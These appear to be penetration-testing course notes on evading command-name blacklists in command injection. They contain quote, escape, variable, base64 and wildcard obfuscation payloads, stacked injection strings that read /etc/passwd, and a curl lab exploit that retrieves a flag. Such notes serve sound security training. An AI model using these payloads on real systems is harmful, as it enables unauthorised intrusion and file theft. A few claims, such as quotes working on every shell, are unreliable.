# Section 8 — Bypassing Blacklisted Commands

---

## Why Command Words Get Blocked

Filters often block dangerous command **names** (`whoami`, `cat`, `nc`, `wget`, etc.) on top of operator/character blocks. The check is usually a string-contains match on the user input:

```php
$blacklist = ['whoami', 'cat', 'ls', 'nc', 'wget', 'curl'];
foreach ($blacklist as $cmd) {
    if (strpos($input, $cmd) !== false) {
        echo "Invalid input"; die();
    }
}
```

Bypass: write the command in a way that bash/PowerShell still understands but the filter string-match doesn't see.

---

## Bash/Linux Quote Obfuscation

Bash strips empty quotes during parsing — the command runs the same:

```bash
w'h'o'am'i           →  whoami     # single quotes
w"h"o"am"i           →  whoami     # double quotes
'w'hoa'm'i           →  whoami     # quotes anywhere
"who"am"i"           →  whoami     # quotes anywhere
```

**Rules:**
- Don't mix quote types in the same word (`w'h"o'am"i` breaks)
- Number of quotes must be even (balanced)
- Quotes can be ANYWHERE — between chars, around groups, at ends

### Backslash escapes (Linux only)
```bash
w\ho\am\i            →  whoami
\w\h\o\a\m\i         →  whoami
```
Bash silently removes backslash escapes of regular chars. No quote-balance restriction.

### Positional parameter `$@`
```bash
who$@ami             →  whoami
w$@ho$@ami           →  whoami
```
`$@` is the array of positional args; in a non-script context it's empty → silently removed.

### `$1`, `$2`, etc. (unset positional args)
```bash
who$1ami             →  whoami      # $1 is unset in interactive shell
```

### Variable concatenation
```bash
a=who; b=ami; $a$b   →  whoami
```
Define empty vars or split words across them.

---

## Windows Obfuscation

### Caret escape (`^`)
```cmd
who^ami              →  whoami
w^h^o^am^i           →  whoami
```
Caret is the CMD escape character — removed before execution.

### PowerShell tick (`` ` ``)
```powershell
who`ami              →  whoami
w`ho`am`i            →  whoami
```
Backtick is PS line-continuation; works mid-word.

### Variable indirection (PowerShell)
```powershell
$a = 'who'; $b = 'ami'; iex ($a + $b)
```

### Cmd variable substitution
```cmd
set a=who & set b=ami & call %a%%b%
```

---

## Combined With Section 6/7 Tricks

When everything is blocked, layer techniques:

```bash
# Blocked: ;, &, |, space, /, cat, whoami
# Allowed: %0a, ${IFS}, ${PATH:0:1}

127.0.0.1%0ac"a"t${IFS}${PATH:0:1}etc${PATH:0:1}passwd
# Decodes to:
# 127.0.0.1
# c"a"t /etc/passwd
# = cat /etc/passwd
```

Three bypasses stacked:
1. Newline as operator (Section 5)
2. `${IFS}` as space, `${PATH:0:1}` as `/` (Section 7)
3. Quote obfuscation on `cat` (this section)

---

## More Obfuscation Patterns

### Reverse command + `rev`
```bash
echo "imaohw" | rev | bash    → whoami
```
If `whoami` is blocked but `rev` isn't.

### Wildcards
```bash
/usr/bin/who*                  → /usr/bin/whoami (and others)
/???/???/who??i                → /usr/bin/whoami
```
Useful when the absolute path is needed but specific filenames are filtered.

### Brace expansion (command name not just args)
```bash
{cat,/etc/passwd}              → cat /etc/passwd
{w,h,o,a,m,i}                  → w h o a m i (NOT useful — separates into 6 commands)
```

### Base64 the whole command
```bash
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
# Y2F0... = "cat /etc/passwd" in base64
```
Filter would need to recognize base64 → decode → check decoded string to catch this.

### Concatenation via printf
```bash
$(printf "%s%s%s%s%s%s" w h o a m i)
$(printf '\167\150\157\141\155\151')          # octal-encoded "whoami"
```

### `bash` invoked indirectly
```bash
$0 -c whoami                   # $0 is the current shell name
${SHELL} -c "id"
```

### Tab-completion abuse (very rare)
```bash
who\ami                         # literal backslash escape
```

---

## Lab — Cat the Flag

**Target:** `154.57.164.73:30363`

Filters in play: `;`, `&`, `|`, space, `/`, `cat`, `whoami` (and likely more) all blocked. Allowed: `%0a`, `${IFS}`, `${PATH:0:1}`, quote obfuscation.

Read `/home/1nj3c70r/flag.txt`:

```bash
curl -sk -X POST "http://154.57.164.73:30363/" \
  --data-urlencode 'ip=127.0.0.1
c"a"t${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt'
```

Decoded payload:
```
127.0.0.1
c"a"t ${IFS} ${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

Server executes:
```
ping -c 1 127.0.0.1
cat /home/1nj3c70r/flag.txt
```

**Flag:** `HTB{b451c_f1l73r5_w0n7_570p_m3}`

Equivalent payloads:
```bash
# Single quotes:
c'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt

# Backslashes:
c\at${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt

# Positional param:
c$@at${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

---

## Exam Notes

- Quote obfuscation (`c"a"t`) is the **canonical** bypass — works on every shell, even-quote constraint is the only gotcha
- Backslash escape (`c\at`) is Linux-only but more forgiving — odd number of escapes OK
- `$@` and `$1` only work in Linux non-script context
- The combined pattern `[ENV_VAR_PATH][QUOTED_CMD]${IFS}[ENV_VAR_SLASH]...` is the workhorse CPTS bypass
- For Windows: caret `^` is the universal CMD escape; backtick `` ` `` for PowerShell
- When commands AND quotes are filtered: escalate to base64 / `rev` / wildcards / variable concatenation (next section)
